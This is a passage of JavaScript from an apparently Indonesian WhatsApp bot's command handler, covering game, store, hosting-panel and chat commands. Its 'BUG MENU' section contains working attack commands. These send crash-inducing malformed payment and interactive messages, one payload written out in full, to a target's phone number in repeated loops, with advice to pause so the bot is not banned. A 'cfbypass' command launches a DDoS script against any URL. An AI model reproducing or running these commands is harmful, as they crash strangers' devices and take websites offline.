reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].ditantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else {
reply(`Anda tidak bisa menghapus sesi tictactoe karena bukan pemain!`)
}
break
//BATAS GAME MENU

//STORE MENU

case 'tunda':
text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`
await ptz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxpending,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break

case 'batal':
text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`
await ptz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxbatal,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break

case 'done': {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply("barang,harga\n\n*Contoh :* Panel Unlimited,2")
if (!text.split(",")) return m.reply("barang,harga\n\n*Contoh :* Panel Unlimited,2")
const [barang, harga] = text.split(",")
if (isNaN(harga)) return m.reply("Format Harga Tidak Valid")
var total = `${harga}000000`
var total2 = Number(`${harga}000`)
const teks = `*TRANSAKSI DONE BY ${ownername} ✅*

*📦 Barang :* ${barang}
*💸 Nominal :* Rp${toRupiah(total2)}
*⏰ Waktu :* ${time}

_*Terimakasih Sudah Mempercayai & Menggunakan Jasa Saya 🥳*_`
 ptz.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: Number(total), requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: `${teks}`, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}
break
//BATAS STORE MENU 

//BUG MENU

case 'xwabeta': {
					if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Usage .${command} 916909137213`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replygcxeon(`Example : ${prefix+command} 916909137213`)
var contactInfo = await ptz.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
    }
    if (cleanedNumber == "919366316008") {
    return;
    }
    if (cleanedNumber == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  async function xeonBugPay(jid){
				await ptz.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await xeonBugPay(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
				}
				break;

case 'betacore':
case 'fatal-systm':
case 'xcrash':{
if (!isCreator) return m.reply(mess.owner)
if (!isPremium) return m.reply(mess.premium)
if (!text) return m.reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = text.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let Pe = bijipler + '@s.whatsapp.net'
await m.reply(mess.bugrespon)
await bugpayflow(Pe, ryobug);
await bugProduk(Pe, force);
await penghitaman(Pe, force);
await sendLiveLocationMessage2(Pe, force);
await bugpayflow(Pe, force2);
await bugpayflow(Pe, ryobug);
await bugpayflow(Pe, force2);
await bugpayflow(Pe, force2);
await bugpayflow(Pe, force2);
await m.reply(`_Successfully Send Bug to ${Pe} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break;

case 'dovure': {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = text.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> Example : ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.wait)
for (let j = 0; j < 10; j++) {
await location(ptz, target, dust, true)
await IosShot(ptz, target)
await sendPaymentInfoMessage(ptz, target)
await coresix(ptz, target, dust)
}
await sleep(5000)
await reply(`*[  !  ]  Successfully Send Bug* To ${target} using ${command}, use it slowly so the bot doesn't get banned :)`)
}
break

case 'xbeta': {
if (!isPremium) return m.reply(mess.premium)
if (!text) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = text.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
await m.reply(`*_tunggu bug Akan Meluncur Tunggu wait proses_*`)
for (let j = 0; j < 10; j++) {
await RiooBugPay(target)
await RiooBugPay(target)
await RiooBugPay(target)
await RiooBugPay(target)
await RiooBugPay(target)
await RiooBugPay(target)
await RiooBugPay(target)
await RiooBugPay(target)
}
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

//BATAS BUG MENU

//JADIBOTMENU

case 'jadibot':{
if (!isPremium) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
jadibot(ptz, m, from)
}
break

case 'stopjadibot':{
if (!isPremium) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
stopjadibot(ptz, from)
}
break

case 'listjadibot':{
if (!isPremium) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
listjadibot(ptz, m)
}
break

case '1gb': {
let t = text.split(' ');
if (!isCreator) return 
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggnya
let loc = global.locnya
let memo = "1048"
let cpu = "50"
let disk = "1000"
let email = username + "1398@gmail.com"
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
const fetch = require('node-fetch')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*DETAIL AKUN SERVER KAMU*

NOTE :
* Bot Mengirim Data Panel Hanya 1x
* Garansi Cuma 1x
* Dilarang DDoS, Atau Menggunakan SC DDoS, Karna Dapat Membuat Panel Down Atau Berpengaruh Kepada Panel

Detail Server :
* Disk : ${disk}
* CPU : ${cpu}
* Memori : ${memo}

${global.botname}`
const baten = new Button();
let ads = baten.setBody(ctf);
ads += baten.setImage(`${global.thumbnailpanel}`);
ads += baten.addCopy("Password", `${password}`)
ads += baten.addCopy("Username", `${user.username}`)
ads += baten.addUrl("Url Panel", `${global.domain}`)
ads += baten.run(u, ptz, m);
let data2 = await f2.json();
let startup_cmd = data2 && data2.attributes && data2.attributes.startup ? data2.attributes.startup : "";
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = reply(`*SUKSES MEMBUAT SERVER✅*

*ID SERVER : ${server.id}*

Untuk Delete Server Silahkan Ketik
_.delsrv id server_
`)
}
break        

case 'cfbypass':{
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`this is how to use it ${prefix + command} <url> <time>`)
let url = q.split(" ")[0]
let time = q.split(" ")[1] * 10
reply(`*[  !  ]  successful ddos web with the following format* :
> method: ${command} 
> Target: ${url} 
> Duration: ${time}

Don't use it too much, because it will have fatal consequences for you (user panel)`)
exec(`node ./lib/ddos/CFBypass.js ${url} ${time}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break 

//RPG MENU
case 'joinrpg':{
if (!m.isGroup) return m.reply("Khusus Group")
if (isPetualang) return m.reply('Kamu Telah join sebelumnya')
users.petualang = true
let itu = 'https://telegra.ph/file/a4ec01498e764ae42c8c4.jpg'
ptz.sendMessage(m.chat, {image:{url: itu}, caption: 'Sukses join Rpg games' }, {quoted:m})
}
break
//BATAS RPG MENU
default:
if (global.db.data.chats[m.chat].ai && body != undefined) {
//if (isSticker) return
if (!m.quoted) return
//if (!m.quoted.isBaileys) return
await sleep(2000)
let puki = await fetchUser(`${text}`, "dirimu adalah anyone AI Asisten Di aplikasi WhatsApp Kamu di kembangkan oleh GhostXdzz saya siap membantu dalam mengerjakan tugas dan bisa menghibur anda", `${pushname}`)
await sleep(3000)
ptz.sendMessage(m.chat, { text : puki.result })
}

let bl = db.data.chats[m.chat].blacklist || [];
if (Object.values(bl).find(users => users.id == m.sender)) {
ptz.sendMessage(m.chat, { delete: { ...m.key }});
}

if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
